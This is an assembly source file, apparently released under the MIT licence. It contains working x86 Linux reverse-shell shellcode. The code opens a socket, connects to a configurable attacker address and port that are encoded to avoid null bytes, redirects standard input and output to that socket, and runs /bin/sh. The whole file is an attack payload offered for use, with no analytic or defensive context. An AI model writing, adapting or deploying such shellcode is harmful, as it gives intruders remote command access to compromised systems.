/*
Copyright (c) 2022 TheOddZer0

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
.global _start

#ifndef IP_ADDRESS
#define IP_ADDRESS	0x02010180
#endif
#ifndef IP_OFFSET
#define IP_OFFSET	0x01010101
#endif
#ifndef PORT
#define PORT		0x5c11
#endif

#define	SYS_SOCKET	0x167
#define	SYS_CONNECT	0x16A
#define	SYS_DUP2	0x3F
#define	SYS_EXECVE	0xB
#define SHELL_PT1	0x68732f2f
#define SHELL_PT2	0x6e69622f

.code32

.section .text

	_start:
		movl	%esp, %ebp
		xorl	%eax, %eax
		pushl	%eax
		pushl	%eax
		movl	$IP_ADDRESS, %ebx
		subl	$IP_OFFSET, %ebx
		pushl	%ebx
		pushw	$PORT
		pushw	$0x02
		xorl	%ebx, %ebx
		xorl	%ecx, %ecx
		xorl	%edx, %edx
		movw	$SYS_SOCKET, %ax
		movb	$0x02, %bl
		movb	$0x01, %cl
		int		$0x80
		movl	%eax, %ebx
		movw	$SYS_CONNECT, %ax
		movl	%esp, %ecx
		movl	%ebp, %edx
		subl	%esp, %edx
		int		$0x80
		xorl	%ecx, %ecx
		movb	$0x03, %cl
		.Lstd:
			xorl	%eax, %eax
			movb	$SYS_DUP2, %al
			decl	%ecx
			int		$0x80
			incl	%ecx
			loop	.Lstd
		xorl	%eax, %eax
		xorl	%edx, %edx
		pushl	%eax
		pushl	$SHELL_PT1
		pushl	$SHELL_PT2
		movb	$SYS_EXECVE, %al
		movl	%esp, %ebx
		int		$0x80
